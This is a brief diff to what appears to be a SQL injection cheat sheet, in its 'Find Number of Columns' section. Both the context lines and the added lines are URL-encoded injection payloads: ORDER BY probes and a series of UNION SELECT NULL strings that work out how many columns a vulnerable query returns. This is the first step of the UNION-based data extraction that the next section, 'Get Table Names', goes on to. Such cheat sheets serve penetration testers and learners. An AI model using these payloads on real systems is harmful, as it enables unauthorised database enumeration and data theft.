@@ -16,6 +16,12 @@ Find Number of Columns
 # Order by "1" should show a valid response, increase value until a different response is returned. 
 '+order+by+1--%20
 '+order+by+1000--%20
+
+# Monitor Responses for Differences. 
+'+UNION+SELECT+NULL--%20
+'+UNION+SELECT+NULL,NULL--%20
+'+UNION+SELECT+NULL,NULL,NULL--%20
+'+UNION+SELECT+NULL,NULL,NULL,NULL--%20
 ```
 
 Get Table Names
